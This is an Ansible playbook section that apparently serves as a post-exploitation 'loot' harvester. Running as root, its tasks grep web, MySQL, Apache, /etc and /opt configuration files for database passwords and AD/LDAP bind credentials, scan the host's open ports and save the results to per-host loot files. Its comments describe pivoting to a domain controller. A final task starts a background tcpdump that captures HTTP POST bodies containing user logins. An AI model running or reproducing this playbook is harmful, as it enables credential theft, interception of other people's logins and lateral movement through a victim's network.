---
# SECTION 1: DATABASE & WEB CREDENTIALS
- name: Extract Database and Web Credentials
  become: yes
  shell: |
    # Scans everything in /var/www and /etc/mysql with zero directory exclusions
    # Captures both assignment styles (key=val) and PHP define styles
    (grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null; \
     grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null) \
    | grep -vE "(\.png|\.jpg|\.svg|\.gif)" \
    | sort -u
  register: db_results
  failed_when: false
  changed_when: false

# SECTION 2: SYSTEM PORT SCAN (Replaces VPN)
- name: Scan for Open Service Ports
  become: yes
  shell: |
    # Fast scan of the top 1000 ports to identify running services
    nmap -sT -T4 --open {{ inventory_hostname }} | grep "tcp open"
  register: port_scan_results
  failed_when: false
  changed_when: false

# SECTION 3: AD/LDAP BIND INFO
- name: Extract AD and LDAP Bind Info
  become: yes
  shell: |
    # Global search for AD/LDAP strings to pivot to SCP-DC-01
    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc /var/www /opt 2>/dev/null \
    | sort -u
  register: ad_bind_results
  failed_when: false
  changed_when: false

# SECTION 4: DELIVERY
- name: Deliver Organized Service Loot
  delegate_to: localhost
  copy:
    content: |
      === SERVICE HARVEST: {{ inventory_hostname }} ===

      [DATABASE & WEB AUTH]
      {{ db_results.stdout if db_results.stdout != "" else "None found" }}

      [OPEN PORTS]
      {{ port_scan_results.stdout if port_scan_results.stdout != "" else "No open ports found" }}

      [AD/LDAP BIND CONFIGS]
      {{ ad_bind_results.stdout if ad_bind_results.stdout != "" else "None found" }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
  become: no

# SECTION 5: LIVE ALERT
- name: CATEGORIZED LOOT ALERT
  debug:
    msg:
      - "--- DB/WEB (Apache/MySQL) ---"
      - "{{ db_results.stdout_lines | default(['None']) }}"
      - "--- OPEN PORTS ---"
      - "{{ port_scan_results.stdout_lines | default(['None']) }}"
      - "--- AD BIND INFO ---"
      - "{{ ad_bind_results.stdout_lines | default(['None']) }}"

# SECTION 6: NETWORK SNIFFER
- name: Start Background Network Sniffer
  delegate_to: localhost
  run_once: true
  become: yes
  shell: |
    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &